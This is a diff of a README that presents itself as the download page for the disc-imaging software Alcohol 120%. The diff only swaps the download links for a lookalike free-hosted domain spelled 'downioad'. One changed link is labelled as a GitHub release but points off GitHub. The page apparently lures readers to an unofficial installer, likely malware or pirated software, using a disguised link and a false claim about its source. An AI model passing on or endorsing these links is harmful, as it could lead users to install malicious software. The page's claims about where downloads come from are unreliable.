@@ -2,7 +2,7 @@
 
 Alcohol 120% is the industry-leading software for creating and managing virtual CD and DVD drives. It allows you to mount disc images and run them as if you had inserted a physical disc, providing a powerful solution for backup, access, and emulation without needing the original media.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest-Setup-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest-Setup-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside — Key Features
 
@@ -52,6 +52,6 @@ A: No. The core purpose of Alcohol 120% is to allow you to work with disc images
 
 Ready to get started? Download the installer directly from our official release page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: October 2026*
